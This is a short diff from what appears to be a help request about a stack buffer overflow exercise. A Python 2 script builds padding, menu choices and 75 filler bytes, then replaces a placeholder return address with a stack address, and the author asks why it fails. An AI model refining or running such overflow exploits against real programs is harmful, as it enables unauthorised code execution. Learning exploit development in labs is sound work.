@@ -97,7 +97,7 @@ now the python script look like
 padding = "5"
 choice  = "1"
 buf ="A"*75
-retn ="BBBB"
+retn ="\xb0\xd8\xff\xff"
 print padding + "\n" + choice +"\n" + buf + retn
 ```
 it dosen't work ?
